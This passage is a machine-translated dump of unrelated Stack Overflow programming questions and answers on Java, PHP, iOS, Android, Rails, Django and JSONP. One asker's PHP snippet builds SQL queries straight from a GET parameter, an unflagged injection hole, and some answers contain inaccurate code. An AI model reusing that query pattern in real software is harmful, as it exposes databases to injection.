这样，只要用户选中一个或多个复选框，就会自动记录并显示选中该复选框的日期。

你能建议我如何处理这个问题吗？

非常感谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T04:53:02.467

我不精通asp，所以我不能给你确切的代码来解决你的问题。但是，我可以解释如何使用 JavaScript 来实现。

在您的`Check_this()`函数中添加一行，将您想要将日期输出到的任何位置设置为当前日期。我不确定你如何在 asp 中获取位置，但是使用纯 HTML 和 JS 会是`document.getElementById("curDate").innerHTML = new Date()`

# java - Java：util_USBUIRT.dll：找不到依赖库

> ID：12078457
> 
> 赞同：2
> 
> 时间：2012-08-22T17:33:57.483
> 
> 标签：java, c++, dll, java-native-interface, usb

我想在个人项目中使用这个 jar 文件（ [http://sourceforge.net/projects/uirt-j/ ）。](http://sourceforge.net/projects/uirt-j/)目前，我一直在使用 Eclipse 并尝试使用*Project > Java Build Path > Add External JARs*来导入该 jar。

导入后，我可以看到 Eclipse 中列出的该包中的所有类，但是，这个 jar 还包含两个 win32 dll 文件，需要与设备通信。我试图将它们添加到*System32*目录，但没有运气。当该代码运行时，它会引发以下异常：

```
 Exception in thread "main" java.lang.UnsatisfiedLinkError:
    C:\Windows\System32\util_USBUIRT.dll: Can't find dependent libraries
    at java.lang.ClassLoader$NativeLibrary.load(Native Method)
    at java.lang.ClassLoader.loadLibrary0(Unknown Source)
    at java.lang.ClassLoader.loadLibrary(Unknown Source)
    at java.lang.Runtime.loadLibrary0(Unknown Source)
    at java.lang.System.loadLibrary(Unknown Source)
    at util.USBUIRT.<clinit>(USBUIRT.java:269)
    at Uirt.main(Uirt.java:6) 
```

使用[dependence walker](https://www.dependencywalker.com/)，我可以看到所有正确链接的dll都可以导入。

这是我试图运行的代码片段：

```
 import util.USBUIRT;
    public class Uirt {
    public static void main(String[] args) {
        String code = "0000";   
        try {
            USBUIRT.transmitIR(code, 2, 3, 2);
        } catch (Exception e) {
            e.printStackTrace();
        }
      }
    } 
```

如果该 JAR 文件是独立执行的，它可以正常工作。我当前的设置在 Windows 7 64 位下运行。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T22:01:00.117

提到的 jar 中的 dll 是 32 位的。环境是Win7 x64。我假设 JVM 是 32 位的，否则会有另一个错误，即：`Can't load IA 32-bit .dll on a AMD 64-bit platform`或类似的。

尝试将 dll 复制到`C:\Windows\SysWOW64`而不是`C:\Windows\System32`. 32 位 dll 应该进入`C:\Windows\SysWOW64`. 它对我有用，尽管我得到了`util.USBUIRT$NotInitializedException`这可能表明库已正确加载。

[文件系统重定向器](http://msdn.microsoft.com/en-us/library/windows/desktop/aa384187%28v=vs.85%29.aspx)文章可能会阐明`SysWOW64`与`System32`.

***编辑：调整 java.library.path***

您也可以使用评论中提到的解决方案，例如，将 dll 复制到`C:\tmp`并使用参数运行：

```
-Djava.library.path="C:\tmp;${env_var:PATH}" 
```

但是由于两个 dll 之间存在依赖关系，`C:\tmp`因此必须在`PATH`. 否则还有`UnsatisfiedLinkError`。手动加载`uuirtdrv.dll`应该有帮助，即：

```
import util.USBUIRT;
public class Uirt {
    static {
        System.loadLibrary("uuirtdrv");
    }

public static void main(String[] args) {
    String code = "0000";   
    try {
        USBUIRT.transmitIR(code, 2, 3, 2);
    } catch (Exception e) {
        e.printStackTrace();
    }
  }
} 
```

# php - 在 Ajax 上需要帮助

> ID：12078459
> 
> 赞同：0
> 
> 时间：2012-08-22T17:34:06.360
> 
> 标签：php, javascript, ajax, onchange

当表单的选择值发生变化时，我正在尝试使用 ajax 函数。它应该显示基于所选州的城市列表。但是，它什么也没做。

城市.php

```
<script type="text/javascript">
function change_state(str)
{
 if (window.XMLHttpRequest)
 {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
 }
 else
 {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
 }
 xmlhttp.onreadystatechange=function()
 {
 if (xmlhttp.readyState==4 && xmlhttp.status==200)
 {
 document.getElementById("cityselector").innerHTML=xmlhttp.responseText;
 }
}
xmlhttp.open("GET","changestate.php?changed_state="+str,true);
xmlhttp.send();
}
</script>

<div class="city-switcher">
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get" id="cityselector" style="position: absolute; top: 15px; left: 310px;">
    <select name="city" onchange="document.forms['cityselector'].submit()" style="font-size: 1.5em;">
    <?php
    $selected_state = select_single("STATE", "locations", "NAME='$location'", "");
    $cities = select("*", "locations", "STATE='$selected_state'", "");
    foreach ($cities as $city){
        echo '<option value="'.$city['NAME'].'" '.($location == $city['NAME'] ? 'selected="selected"' : '').'>'.$city['NAME'].'</option>';
    }
    ?>
    </select>
</form>
    <select name="state" onchange="change_state(this.value)" style="font-size: 1.5em;">
    <?php
    $states = select("DISTINCT STATE", "locations", "", "ORDER BY STATE ASC");
    $selected_state = select_single("STATE", "locations", "NAME='$location'", "");
    foreach ($states as $state){
        echo '<option value="'.$state['STATE'].'" '.($selected_state == $state['STATE'] ? 'selected="selected"' : '').'>'.$state['STATE'].'</option>';
    }
    ?>
    </select>

 </div> 
```

更改状态.php

```
<?php
 include '../config.php';
 include '../library.php';

 $changed_state = $_GET['changed_state'];

 echo '<select name="city" onchange="document.forms[\'cityselector\'].submit()" style="font-size: 1.5em;">';
 $cities = select("*", "locations", "STATE='$changed_state'", "");
 foreach ($cities as $city){
echo '<option value="'.$city['NAME'].'" '.($location == $city['NAME'] ? 'selected="selected"' : '').'>'.$city['NAME'].'</option>';
 }
 echo '</select>';
 ?> 
```

谁能告诉我我做错了什么。

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:09:22.007

想通了问题。问题是我的路径是错误的`xmlhttp.open("GET","changestate.php?changed_state="+str,true);`

相反，它应该是

```
xmlhttp.open("GET","sections/changestate.php?changed_state="+str,true); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:37:57.193

重读后我正在修改我的答案

```
<select name="state" onchange="change_state(this.value)" 
```

应该

```
<select ... onchange="change_state(this.options[this.selectedIndex].value)" ... 
```

# ios - UIPrintPageRenderer paperRect 总是返回 0x0

> ID：12078461
> 
> 赞同：0
> 
> 时间：2012-08-22T17:34:20.657
> 
> 标签：ios, printing, ios5, uiprintpagerenderer

我已经在我的 iOS 应用程序中设置了打印，它工作正常。但是，我正在根据用户对页面大小的偏好生成我的文档。我希望我可以从打印机系统检测页面大小并改用它。UIPrintPageRenderer 的 paperRect 属性似乎正是我所需要的，但它总是为我返回 0x0 的大小。我错过了什么吗？这是代码：

```
UIPrintInteractionController *printController = [UIPrintInteractionController sharedPrintController];
UIPrintPageRenderer *pageRenderer = [[UIPrintPageRenderer alloc] init];
printController.printPageRenderer = pageRenderer;
NSLog(@"paper size: %f x %f", pageRenderer.paperRect.size.width, pageRenderer.paperRect.size.height); 
```

我在 iOS 4.2 发布时尝试了这个，当我得到 0x0 时，我认为这是一个第一版错误并实现了用户偏好。但是现在我在 iOS 5.1 中看到了同样的问题，我想知道我是不是做错了什么。

当这段代码运行时，用户还没有选择打印机，所以我希望 paperRect 返回一个默认的纸张大小。如果它在用户选择打印机后再次运行（例如，在打印第二个文档时），我希望它返回为该打印机选择的纸张尺寸。但这只是我的期望......[文档](http://developer.apple.com/library/ios/#documentation/iPhone/Reference/UIPrintPageRenderer_Class/Reference/Reference.html)没有解释何时或如何设置其值。

了解其他人是否获得相同的结果或者我是否需要做其他事情来获得真实的页面大小会很有帮助。

PS 我还查看了 UIPrintInteractionController 的 paperSize 属性，当包含在上面的代码中时，它也返回 0x0。显然，它稍后在打印过程中由委托函数更新，但我没有进一步探索。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-21T06:57:22.340

paperRect 和 printableRect 旨在用于 numberOfPages 来计算页数。UIKit 不会为 paperRect 和 printableRect 设置任何值，直到用户触摸 UIPrintInteractionController 中的 Print 按钮。

# android - 方法调用在两者之间终止并跳转到下一个方法调用

> ID：12078463
> 
> 赞同：1
> 
> 时间：2012-08-22T17:34:25.683
> 
> 标签：android, methods, execution, sequential

我正在尝试在android中构建一个记事本应用程序。我在这种情况下，当用户选择创建新文件同时仍在处理文件时，应用程序应首先要求保存，然后重新启动 MainActivity 以创建新文件。

所以，基本上，顺序如下：

-> 处理当前文件
-> 单击新文件
-> 保存对话框
-> 重新启动 MainActivity。

为此，我一直在使用一种名为 new file 的方法，如下所示：

```
public void new_file()
    {
        save_file();
        Intent intent = new Intent(this, MainActivity.class);
        startActivity(intent);
    } 
```

这里的问题是，每次我运行应用程序并输入这部分代码时，都会弹出对话框并立即创建一个新文件。

我想知道如何先让 Activity 完成 save_file() 方法调用，然后再让 Activity 重新启动。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:37:49.183

看起来它工作正常，但没有看到 safe_file() 代码（顺便说一句：考虑切换到更标准的函数命名约定）很难确定，但请注意对话框是**异步**的，因此您无法启动对话框并期望所有进一步的代码等待对话框关闭。我假设您在 safe_file() 方法中弹出对话框，因此您应该在完成保存后回调以从那里开始新活动，或者您应该在对话框单击侦听器中执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:42:19.147

使用 AlertDialog 机制的[Negative](http://developer.android.com/reference/android/content/DialogInterface.html#BUTTON_NEGATIVE)、[Positive](http://developer.android.com/reference/android/content/DialogInterface.html#BUTTON_POSITIVE)和[Neutral](http://developer.android.com/reference/android/content/DialogInterface.html#BUTTON_NEUTRAL)按钮来检测用户何时退出对话框。然后，使用 OnClickListener 来决定单击了哪个按钮，然后才重新启动 Activity。就像是：

1.  显示对话框
2.  等待其中一个按钮被点击
3.  单击按钮时重新启动活动，因为这意味着用户正在退出对话框。

# php - Jquery表单插件未提交到流程页面

> ID：12078465
> 
> 赞同：0
> 
> 时间：2012-08-22T17:34:36.223
> 
> 标签：php, jquery, html, ajax, forms

我有一个使用 Jquery 表单插件的基本联系表单。我无法使用插件提交它。仅当我将 php 包含添加到 process.php 时，它才会提交。

Javascript：

```
 $(document).ready(function() { 
     $("#contact").validate({
         submitHandler: function(form) {
             $(form).ajaxSubmit({
                 url:"process.php",
                 type:"post",
             });
         }
     });
 }); 
```

这是我的联系表格：

```
 <form id="contact" method="post" name="validation" action="contact.php" onsubmit="return validateForm();">
     <fieldset> 

         <label for="name">Name</label>
         <input type="text" name="name" placeholder="Full Name" title="Enter your name" class="required">

         <label for="email">E-mail</label>
         <input type="email" name="email" placeholder="yourname@domain.com" title="Enter your e-mail address" class="required email">

         <label for="phone">Phone</label>
         <input type="tel" name="phone" placeholder="ex. (555) 555-5555">

         <label for="message">Question/Comment</label>
         <textarea name="message"></textarea>

         <input type="submit" name="submitted" class="button" id="submit" value="Send Message"     />

     </fieldset>
 </form> 
```

进程.php

```
 <?php
   function GetHeaders()
   {
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    // Additional headers
    $headers .= 'From: Company Name<info@companyname.com>' . "\r\n";
    return $headers;
   }
   // Get Data  
   $name = strip_tags($_POST['name']);
   $email = strip_tags($_POST['email']);
   $phone = strip_tags($_POST['phone']);
   $message = strip_tags($_POST['message']);
    // Send Message
    $headers = GetHeaders();
    $intro = "\"Thank you for contacting Company Name. We are very interested in assessing your situation and will be in touch as soon possible.\" <br />
    <br/>
      Best Regards,<br/>
    <br/>
      Company<br/>
    ";
 mail($email, "RE: Contact Form Submission", $intro, $headers);      
 ?> 
```

感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:51:08.790

您需要`onsubmit="return validateForm();`从表单属性中删除 。您已经`$("#contact").validate({`在查询就绪功能中验证使用

此外，您的表单似乎提交给contact.php，而不是process.php

```
action="contact.php" 
```

# html - Rails：将文本字段的换行符转换为

> ID：12078467
> 
> 赞同：16
> 
> 时间：2012-08-22T17:34:41.970
> 
> 标签：html, ruby-on-rails, line-breaks

我的模型中有一个名为“about”的文本字段，我试图在显示页面上显示它，但没有一个换行符正确显示。

我已经尝试了很多东西，但我最终登陆的代码是：

```
<%= (h @template.about).gsub("\n", "<br />") %> 
```

不幸的是，Rails 似乎正在转义所需的 HTML 并将这些换行符输出为

```
Thanks for the fish, guys! Not like I wanted it, but... uh... thanks? &lt;br /&gt; 
```

如何正确地将文本字段的“\n”换行符转换为实际的换行 HTML？我也已经尝试过简单的格式，但无济于事......

我正在使用 Rails 3，'about' 的前几行是：

> 谢谢你的鱼，伙计们！不是我想要的，但是……呃……谢谢？
> “我会做这件事的评判者，”他说！
> 现在，还有更多无用的副本，这样我就可以分离出阿曼达发现的那个奇怪的芽。
> 等待！我的意思是“奇怪的错误……”

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-08-22T17:47:39.160

尝试

```
<%= simple_format @template.about %> 
```

[http://api.rubyonrails.org/classes/ActionView/Helpers/TextHelper.html#method-i-simple_format](http://api.rubyonrails.org/classes/ActionView/Helpers/TextHelper.html#method-i-simple_format)

这个对我有用 ：-\

```
1.9.3p194 :017 > str = "Thanks for the fish, guys! Not like I wanted it, but... uh... thanks? 
1.9.3p194 :018"> \"I'll be the judge of that,\" he said! 
1.9.3p194 :019"> And now, more useless copy so I can isolate that weird bud that Amanda found. 
1.9.3p194 :020"> Wait! I meant 'weird bug..."
 #=> "Thanks for the fish, guys! Not like I wanted it, but... uh... thanks? \n\"I'll be the judge of that,\" he said! \nAnd now, more useless copy so I can isolate that weird bud that Amanda found. \nWait! I meant 'weird bug..."

1.9.3p194 :021 > simple_format str
 #=> "<p>Thanks for the fish, guys! Not like I wanted it, but... uh... thanks? \n<br />\"I'll be the judge of that,\" he said! \n<br />And now, more useless copy so I can isolate that weird bud that Amanda found. \n<br />Wait! I meant 'weird bug...</p>" 
```

或使用`gsub`

```
1.9.3p194 :022 > str.gsub("\n", "<br />") 
 #=> "Thanks for the fish, guys! Not like I wanted it, but... uh... thanks? <br />\"I'll be the judge of that,\" he said! <br />And now, more useless copy so I can isolate that weird bud that Amanda found. <br />Wait! I meant 'weird bug..." 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-01-24T19:26:06.690

```
<%= (h @template.about).gsub("\n", "<br />").html_safe %> 
```

`h`助手会**转义**文本，这样您就不会受到 XSS 攻击。一旦该文本被转义，您就可以`gsub`将新字符串声明为`html_safe`.

`html_safe`不是**转义**，它是不应该转义字符串的声明。但是您确实想转义原始字符串，除非您确定它不包含用户输入。

# spring - 当使用违反唯一约束的实体调用 persist() 时没有持久性异常

> ID：12078474
> 
> 赞同：0
> 
> 时间：2012-08-22T17:35:01.573
> 
> 标签：spring, eclipselink, hsqldb, entitymanager

我对我的实体的一个属性有一个独特的约束：

```
Table(uniqueConstraints = @UniqueConstraint(name = "UniqueByEmail", columnNames = "email"))
public class Player implements Serializable {
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private long id;

    @Column(name = "email")
    private String email;
    ...
} 
```

在我的 DAO 中，当某些东西试图创建一个违反此约束的新玩家时，我想抛出一个适当的异常：

```
public Player create(String email, String password) {
    Player player = new Player(email, password);
    try {
        em.persist(player);
    } catch (Exception e) {
        System.err.println("I GOT AN EXCEPTION : " + e.getClass());
    }
    return player;
} 
```

不幸的是，什么也没有发生。当我在实体管理器上调用flush（）时，我会因为这个调用而得到持久性异常，但当我调用persist（）时却没有。

这种行为与休眠的行为不同，所以我认为我配置错误。

任何帮助是极大的赞赏。

Persistence.xml：org.eclipse.persistence.jpa.PersistenceProvider model.GameInstanceAccount Player

春天应用上下文.xml：

```
<tx:annotation-driven transaction-manager="transactionManager"/>
<bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
    <property name="entityManagerFactory" ref="entityManagerFactory" />
</bean>

<bean id="entityManager" class="org.springframework.orm.jpa.support.SharedEntityManagerBean">
    <property name="entityManagerFactory" ref="entityManagerFactory" />
</bean>

<bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
    <property name="persistenceUnitName" value="persistence-unit" />
    <property name="jpaDialect" ref="jpaDialect" />
    <property name="jpaVendorAdapter">
        <bean class="org.springframework.orm.jpa.vendor.EclipseLinkJpaVendorAdapter" />
    </property>
</bean>

<bean id="jpaDialect" class="org.springframework.orm.jpa.vendor.EclipseLinkJpaDialect" />

<bean id="jpaVendorAdapter" class="org.springframework.orm.jpa.vendor.EclipseLinkJpaVendorAdapter">
    <property name="generateDdl" value="true" />
    <property name="databasePlatform" value="org.eclipse.persistence.platform.database.HSQLPlatform" />
</bean> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:29:52.957

> 当我在实体管理器上调用 flush() 时，由于此调用，我得到了持久性异常，但当我调用 persist() 时却没有

这是预期的行为。持久调用仅将瞬态实体附加到当前持久会话，使其受到管理。该约束适用于数据库，因此仅在刷新持久性会话并将新实体插入数据库时​​才会应用。

[在这篇博客](http://spitballer.blogspot.com/2010/04/jpa-persisting-vs-merging-entites.html)中总结如下：

> 将新创建的实体类实例传递给persist 方法。在此方法返回后，将管理实体并计划将其插入数据库。它可能发生在事务提交时或之前，或者调用 flush 方法时。

# django - Django 上下文处理器未在模板中设置请求变量

> ID：12078476
> 
> 赞同：1
> 
> 时间：2012-08-22T17:35:03.887
> 
> 标签：django, django-templates, django-socialauth

我有以下看法：

```
@login_required
def manage(request):
    ''' Display the list of posts that belong to the user '''
    posts = Post.objects.filter(user=request.user).order_by('created_at')
    return render_to_response('posts/manage.html', {'posts':posts}, context_instance=RequestContext(request)) 
```

我的模板中的`request`变量为空。

我的设置：

```
TEMPLATE_CONTEXT_PROCESSORS = (
    "django.contrib.auth.context_processors.auth",
    "django.core.context_processors.debug",
    "django.core.context_processors.i18n",
    "django.core.context_processors.media",
    "django.core.context_processors.static",
    "django.core.context_processors.tz",
    "django.contrib.messages.context_processors.messages",
    'social_auth.context_processors.social_auth_by_name_backends',
) 
```

我想通过`request.user`.

有什么问题？谢谢。

请注意，我使用社交身份验证进行用户登录。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-22T17:37:39.970

添加`'django.core.context_processors.request'` `to your TEMPLATE_CONTEXT_PROCESSORS`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-22T18:14:59.823

使用这些上下文处理器，您根本无法访问`request`- 但您可以`user`直接访问。

# jquery - AJAX 获取请求失败：JSONP

> ID：12078477
> 
> 赞同：2
> 
> 时间：2012-08-22T17:35:08.767
> 
> 标签：jquery, ajax, json, jsonp

我在运行我的 django 应用程序的同一主机上运行了一个休息服务器（python 瓶）。从我的 django 应用程序中，我正在使用 ajax 执行获取请求，但是即使我可以在我的休息服务器上看到请求的状态成功，请求也会失败（返回代码 200，成功）

我的阿贾克斯代码：

```
 $.ajax({
               url: 'http://hostname:port/ListVms/',
               crossDomain: true, 
               contentType: "application/json",
               dataType: 'jsonp',
               success: function(data) {
                   alert('worked');
               },
               error: function() {
                   alert("Sorry, error retrieving!");
               }
           }); 
```

Python 休息方法：

```
 @route('/ListVms/', method='GET')
            def get_event():
                return json.dumps(JS) 
```

其余服务的输出：

```
 [22/Aug/2012 10:25:45] "GET /ListVms/?callback=jQuery17102901058990901989_1345656355311&_=1345656355356 HTTP/1.1" 200 44 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T17:45:45.323

我猜你的服务器正在返回 JSON，如下所示：

```
{ "abc": 123 } 
```

此格式与 JSONP 不兼容。JSONP 需要将 JSON 传递给的回调函数。回调函数在该查询字符串中传递给您的服务器。

因此，使用 JSONP 浏览器会像下面这样写一个脚本标签：

```
<script src="http://hostname:port/ListVms/?callback=jQuery17102901058990901989_1345656355311"></srcipt> 
```

您的服务器应该对此做出响应：

```
jQuery17102901058990901989_1345656355311({
  "abc": 123
}); 
```

Typically servers that serve JSON and want to support JSONP have a conditional that looks kind of like this:

```
if queryString.callback
  render queryString.callback + "(" + jsonData + ")"
else
  render jsonData 
```

# eclipse - 如何在文本后面显示“打印边距”指南

> ID：12078478
> 
> 赞同：1
> 
> 时间：2012-08-22T17:35:09.690
> 
> 标签：eclipse

在 Eclipse 3.8 中，我启用了打印边距，以帮助我将行数限制为少于 80 个字符。但是，因为我经常使用行更长的外部代码，所以我将引导颜色设置为浅灰色以防止干扰文本。

我的问题是一些字母在指南下被扭曲了。例如，`o`看起来像`c`。是否可以更改顺序以使指南显示在文本后面而不是在文本上方？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T01:32:32.733

不幸的是，似乎没有解决办法。
[错误 17805 - [绘画] 在文本顶部绘制的打印边距](https://bugs.eclipse.org/bugs/show_bug.cgi?id=17805)

# sharepoint-2010 - Hide specific item in lookup column

> ID：12078479
> 
> 赞同：1
> 
> 时间：2012-08-22T17:35:10.970
> 
> 标签：sharepoint-2010

My form has lookup column which gets data from another list but I want to remove/hide particular item in the lookup column.

For example; My look up columns gets A;B;C;D;E entries from another list now I don't want to show E in my lookup column .

I can accomplish this if I customize the form in InfoPath but my list(which has lookp column) must be used as "Data sheet view" and InfoPath customization don't work on data sheet view.

Tried using JQuery but didn't work.

Any suggestions ?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:26:56.863

显然，您永远不应该将 jQuery 用于与安全相关的实践。如果用户关闭了 javascript 怎么办？

这个问题似乎与项目级别的权限有关。也就是说，项目级别的权限通常被认为是最佳实践类型的最后手段，所以我建议您首先考虑是否可以将项目 E 完全移动到不同的列表中，该列表只能由某些方查看。

# javascript - Removing the day from a date string with jQuery

> ID：12078480
> 
> 赞同：2
> 
> 时间：2012-08-22T17:35:11.180
> 
> 标签：javascript, jquery, drupal

I am trying to remove the "day" from every possible date occurrence on a page.

This is to make jQuery turn every date in the format of "08/22/2012" into "08/2012"

I was able to do this with this code: [Replacing wildcard text using jquery](https://stackoverflow.com/questions/4606853/replacing-wildcard-text-using-jquery)

See my fiddle for more information: [http://jsfiddle.net/CfZjF/223/](http://jsfiddle.net/CfZjF/223/)

But it just isn't working within this table layout, regardless of what I have tried.

Another problem will be to specify the day specifically (maybe with wildcards?)-- that is the 2 numbers between the forward-slashes: /xx/, but please see the fiddle for more info.

Any ideas on how I can pull this off?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:37:28.223

Try

```
str.replace(/\/\d+\//g, "/"); 
```

Or be more specific by replacing `/(\d{2})\/\d{2}\/(\d{4})/g` with `"$1/$2"` or something…</p>

([Updated fiddle](http://jsfiddle.net/CfZjF/224/))

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:47:16.440

我认为您应该单独遍历表格单元格，而不是尝试对整行 HTML 进行全局处理。

这假设您的数据格式与您的 jsFiddle 中的一样。

更新小提琴：http: [//jsfiddle.net/GKrCS/](http://jsfiddle.net/GKrCS/)

```
$('tr').each(function(){
       $('td',this).not(':first').text(
           function(){
               return $(this).text().replace(/\/[0-9]+\//,'/');
           });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:48:07.350

由于您所有的日期都采用 xx/xx/xxxx 的形式，因此使用简单的 split() 将始终将其拆分为具有以下值的数组：

```
xx,xx,xxxx 
```

所以，像这样：

```
var totalDate = $("whateverYourDateSelectorMightBe");
var daysInMiddle = totalDate.val().ToString().split(",")[1]; 
```

那么你可以这样做：

```
totalDate.val(totalDate.val().ToString().replace(daysInMiddle + "/","")); 
```

请注意，有很多更简洁的方法可以做到这一点。我这样做是因为我认为它更好地解释了我想要做的事情。

# android - Is it possible to play sound in Firefox for Android

> ID：12078481
> 
> 赞同：0
> 
> 时间：2012-08-22T17:35:14.230
> 
> 标签：android, firefox

Can't find such details on Firefox for Android, is it possible to play or make any audio alert with for ex. HTML5 on 2.x android device?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-21T06:14:03.017

除了使用音频 HTML 元素之外，您还可以使用 Web 音频 API。看：

[https://developer.mozilla.org/en-US/docs/Web_Audio_API](https://developer.mozilla.org/en-US/docs/Web_Audio_API)

# c++ - using a custom compiler flag in cmake?

> ID：12078482
> 
> 赞同：0
> 
> 时间：2012-08-22T17:35:21.327
> 
> 标签：c++, makefile, cmake

I'm trying to compile some code I found on GitHub [https://github.com/tapio/Wendy](https://github.com/tapio/Wendy) I'm just trying to compile the stuff in tests/. I never had any experience with cmake, but they're kinda logical anyway.

I got stuck at the part where cmake does this:

```
 /usr/bin/c++       CMakeFiles/clear.dir/clear.o  -o clear -rdynamic -lwendy -lglfw -lGLEW -lglm -lz 
```

and gets this error:

```
 Linking CXX executable clear
   /usr/bin/ld: cannot find -lwendy
   /usr/bin/ld: cannot find -lglm
   collect2: ld returned 1 exit status
   make[3]: *** [clear] Error 1
   make[2]: *** [CMakeFiles/clear.dir/all] Error 2
   make[1]: *** [CMakeFiles/clear.dir/rule] Error 2
   make: *** [clear] Error 2 
```

I don't understand how the Wendy and glm folder became a compiler flag. Somebody please explain how this is possible. :(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:41:46.023

在`tests/CMakeLists.txt`该行中`target_link_libraries(${test} wendy ${WENDY_LIBRARIES})`指示 cmake 将库列表链接`WENDY_LIBRARIES`到可执行文件。

# deployment - Track Config Files in Source Control and Deploy from CI

> ID：12078485
> 
> 赞同：1
> 
> 时间：2012-08-22T17:35:25.987
> 
> 标签：deployment, version-control, hudson, configuration-files

As many apps do, we have a number of config and properties files for our Java applications. We have gone with the approach of keeping these files separate from our codebase (i.e. they are not included in the war files for deployment) but in a separate directory. However, I would still like to track changes to these files in a source control and deploy them using our CI.

I'm looking for strategies on how others have done this. Did you write a script to push the files to the app server(s). Does the script live on the CI server?

Our SCM is Mercurial which we have set up on its own server to use as a central repo. Our CI is Hudson (not Jenkins) set up on its own server and of course our app servers are separate from these as well. All servers are *nix OS.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-26T21:38:32.747

考虑使用[puppet](http://puppetlabs.com/)或[chef 之](http://www.opscode.com/chef/)类的配置管理工具来管理所有应用程序配置文件。这两种工具都使用“清单”或“收据”，它们可以置于修订控制之下，并与部署应用程序的每个服务器相匹配。

另一种选择是考虑为您的操作系统开发安装包，有关更多详细信息，请参阅以下文章：

*   [http://www.sonatype.com/people/2011/11/bringing-java-and-linux-together-on-the-way-to-continuous-live-deployment/](http://www.sonatype.com/people/2011/11/bringing-java-and-linux-together-on-the-way-to-continuous-live-deployment/)

这样做的好处是可以将安装配置为生成为其部署的环境量身定制的正确配置。一个更重要的好处是它更易于管理和安装。

# windows-phone-7 - Can't add System.Windows.Media.Imaging.JpegBitmapEncoder in WP

> ID：12078486
> 
> 赞同：0
> 
> 时间：2012-08-22T17:35:33.950
> 
> 标签：windows-phone-7, serialization, jpeg, system.windows.media

I'm trying to use the type `JpegBitmapEncoder`in the name space `System.Windows.Media.Imaging`, but i can't seem to use it. The namespace itself is available and i can use it but for some reason the JpegBitmapEncoder is not there... How can i use it?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:41:37.883

也许您可以使用[WritableBitmap](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.writeablebitmap.aspx)上的扩展方法来加载和保存 jpeg。

[扩展方法 - LoadJpeg、SaveJpeg](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.extensions_methods%28VS.92%29.aspx)

如果要从图像中获取字节数组，请使用 a`MemoryStream`及其[`ToArray`](http://msdn.microsoft.com/en-us/library/system.io.memorystream.toarray.aspx)获取数据。

```
MemoryStream stream = new MemoryStream();
image.SaveJpeg(stream, width, height, 0, 80);
stream.Position = 0;
byte[] buffer = stream.ToArray(); 
```

# knockout.js - Knockout set attributes and click event

> ID：12078491
> 
> 赞同：1
> 
> 时间：2012-08-22T17:35:46.283
> 
> 标签：knockout.js, asp.net-mvc-4, knockout-2.0

I did declare click like that in my template

```
<script id="flipTemplate" type="text/html">

    <div data-bind="attr: {id:  ImageName }, click: alert('a')">
    ......

</script> 
```

But `alert('a')` executing straight away i clicking my button which is generated dynamic content instead of alerting when i am clicking on that div.

is there any way how to fix that?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:50:53.503

knockoutjs 期望一个函数作为[点击绑定](http://knockoutjs.com/documentation/click-binding.html)参数，而不是任意的 js 语句。

因此，您需要将警报调用包装到匿名函数中

```
<div data-bind="attr: {id:  ImageName }, click: function(data, event) { alert('a') } "> 
```

但我强烈建议将所有逻辑放入您的 ko 视图模型中，并在绑定中使用视图模型方法。所以不要将逻辑放入`data-bind`表达式中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:42:19.180

我不确定你为什么要这样设置你的 Div。这会更好吗？

```
 <div id="mydiv"/>

    <script>
      $(document).ready(function() {
           $("#mydiv").click(function(ev){
             ev.preventDefault();
             alert("a");
           });
      });
    </script> 
```

# ruby-on-rails - ruby on rails before save update another table first

> ID：12078500
> 
> 赞同：0
> 
> 时间：2012-08-22T17:37:00.623
> 
> 标签：ruby-on-rails, model, associations, before-save

I am trying to update another associated table before saving but i am getting into errors i am not familiar with...

so i have in my model

**post.rb**

```
 before_save :update_total_items

  def update_total_items
    b = Tags.find(:tag_id => self.tag_id)
    b.total_items = b.total_items+1
    b.save
  end 
```

but i get an error

```
Unknown key tag_id 
```

so how can i access the property i am adding before i save it in order to use it and update an existing associated on another table?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:40:13.197

通常`id`模型的 就是这样称呼的。通常你想要的是：

```
b = Tags.find(self.tag_id) 
```

请注意，如果找不到记录，这可能会引发 ActiveRecord::RecordNotFound 异常。更安全的方法是：

```
if (b = Tags.where(:id => self.tag_id).first)
